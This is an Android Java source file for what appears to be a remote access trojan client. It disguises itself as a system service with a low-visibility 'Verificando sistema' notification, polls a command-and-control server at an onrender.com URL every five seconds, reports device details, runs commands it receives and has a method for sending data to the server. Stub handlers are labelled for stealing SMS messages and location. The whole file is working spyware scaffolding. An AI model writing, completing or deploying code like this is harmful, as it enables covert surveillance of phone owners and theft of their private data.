// language: Java, file: MainService.java
package com.system.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import org.json.JSONObject;
import java.io.IOException;
import java.util.UUID;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainService extends Service {
    private final OkHttpClient client = new OkHttpClient();
    private final String C2_BASE_URL = "https://rat-panel-uwa8.onrender.com";
    private String deviceId = "";
    private Handler handler;
    private Runnable pollRunnable;

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundNotification();
        handler = new Handler(Looper.getMainLooper());

        SharedPreferences prefs = getSharedPreferences("sys", MODE_PRIVATE);
        deviceId = prefs.getString("id", null);
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString();
            prefs.edit().putString("id", deviceId).apply();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        pollRunnable = new Runnable() {
            @Override
            public void run() {
                sendPollRequest();
                handler.postDelayed(this, 5000);
            }
        };
        handler.post(pollRunnable);
        return START_STICKY;
    }

    private void sendPollRequest() {
        try {
            JSONObject json = new JSONObject();
            json.put("device_id", deviceId);
            json.put("model", Build.MODEL);
            json.put("android", Build.VERSION.RELEASE);

            RequestBody body = RequestBody.create(MediaType.parse("application/json"), json.toString());
            Request request = new Request.Builder()
                    .url(C2_BASE_URL + "/api/poll")
                    .post(body)
                    .build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {}

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful() && response.body() != null) {
                        try {
                            JSONObject res = new JSONObject(response.body().string());
                            String cmd = res.optString("command");
                            if (cmd != null && !cmd.isEmpty() && !cmd.equals("null")) {
                                handleCommand(cmd);
                            }
                        } catch (Exception e) {}
                    }
                }
            });
        } catch (Exception e) {}
    }

    private void handleCommand(String command) {
        // Aqui entram as ações (SMS, Location, etc). Deixei os esqueletos.
        if (command.equals("get_sms")) {
            // Roubar SMS
        } else if (command.equals("get_location")) {
            // Roubar Localização
        }
    }

    public void sendDataToC2(String type, String data) {
        try {
            JSONObject json = new JSONObject();
            json.put("device_id", deviceId);
            json.put("type", type);
            json.put("data", data);

            RequestBody body = RequestBody.create(MediaType.parse("application/json"), json.toString());
            Request request = new Request.Builder()
                    .url(C2_BASE_URL + "/api/data")
                    .post(body)
                    .build();
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {}
                @Override
                public void onResponse(Call call, Response response) throws IOException {}
            });
        } catch (Exception e) {}
    }

    private void startForegroundNotification() {
        String channelId = "sys_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, channelId);
        } else {
            builder = new Notification.Builder(this);
        }
        
        builder.setContentTitle("Verificando sistema")
               .setSmallIcon(android.R.drawable.stat_notify_sync);
               
        startForeground(1, builder.build());
    }

    @Override
    public void onDestroy() {
        if (handler != null && pollRunnable != null) {
            handler.removeCallbacks(pollRunnable);
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
